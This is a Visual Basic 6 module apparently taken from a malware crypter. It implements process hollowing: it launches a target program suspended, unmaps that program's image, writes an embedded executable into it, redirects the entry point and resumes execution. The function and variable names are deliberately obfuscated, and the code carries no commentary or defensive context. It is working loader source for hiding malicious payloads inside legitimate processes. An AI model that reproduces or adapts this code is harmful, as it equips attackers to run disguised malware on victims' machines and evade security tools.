Attribute VB_Name = "rundsc"
Option Explicit
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)
Private Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D
    IMAGE_OS2_SIGNATURE = &H454E
    IMAGE_OS2_SIGNATURE_LE = &H454C
    IMAGE_VXD_SIGNATURE = &H454C
    IMAGE_NT_SIGNATURE = &H4550
End Enum

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Const IMAGE_SIZEOF_SHORT_NAME = 8

Private Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   characteristics  As Long
End Type

Const OFFSET_4 = 4294967296#

Private Function jfghbcvbgf(ByVal characteristics As Long) As Long
   Dim mapping As Variant
   mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, _
                   PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, _
                   PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
   jfghbcvbgf = mapping(hjvbvc(characteristics, 29))
End Function

Private Function hjvbvc(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
    hjvbvc = derfgfgd(lValue) / (2 ^ lNumberOfBitsToShift)
End Function

Private Function derfgfgd(ByVal Value As Long) As Double
    If Value < 0 Then
        derfgfgd = Value + OFFSET_4
    Else
        derfgfgd = Value
    End If
End Function
Public Function nmbrrtg(ByVal Target As String, ghfbvbv() As Byte) As Long
    Dim idh As IMAGE_DOS_HEADER
    Dim inh As IMAGE_NT_HEADERS
    Dim ish As IMAGE_SECTION_HEADER
    Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFO
    Dim Context As CONTEXT86
    Dim ImageBase As Long, ret As Long, i As Long
    Dim addr As Long, lOffset As Long
        
    CopyMemory idh, ghfbvbv(0), Len(idh)
    If idh.e_magic <> IMAGE_DOS_SIGNATURE Then
       Exit Function
    End If
    CopyMemory inh, ghfbvbv(idh.e_lfanew), Len(inh)
    If inh.Signature <> IMAGE_NT_SIGNATURE Then
       Exit Function
    End If
    
    si.cb = Len(si)
    If CreateProcess(vbNullString, Target, 0, 0, False, CREATE_SUSPENDED, 0, 0, si, pi) = 0 Then
       Exit Function
    End If
    Context.ContextFlags = CONTEXT86_INTEGER
    If GetThreadContext(pi.hThread, Context) = 0 Then GoTo ClearProcess
    Call ReadProcessMemory(pi.hProcess, ByVal Context.Ebx + 8, addr, 4, 0)
    If addr = 0 Then GoTo ClearProcess
    If ZwUnmapViewOfSection(pi.hProcess, addr) Then GoTo ClearProcess
    ImageBase = VirtualAllocEx(pi.hProcess, ByVal inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    If ImageBase = 0 Then GoTo ClearProcess

    Call WriteProcessMemory(pi.hProcess, ByVal ImageBase, ghfbvbv(0), inh.OptionalHeader.SizeOfHeaders, ret)
    lOffset = idh.e_lfanew + Len(inh)
    For i = 0 To inh.FileHeader.NumberOfSections - 1
        CopyMemory ish, ghfbvbv(lOffset + i * Len(ish)), Len(ish)
        Call WriteProcessMemory(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ghfbvbv(ish.PointerToRawData), ish.SizeOfRawData, ret)
        Call VirtualProtectEx(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ish.VirtualSize, jfghbcvbgf(ish.characteristics), addr)
    Next i
    Call WriteProcessMemory(pi.hProcess, ByVal Context.Ebx + 8, ImageBase, 4, ret)
    Context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
    Call SetThreadContext(pi.hThread, Context)
    Call ResumeThread(pi.hThread)
    Exit Function
ClearProcess:
    CloseHandle pi.hThread
    CloseHandle pi.hProcess
End Function


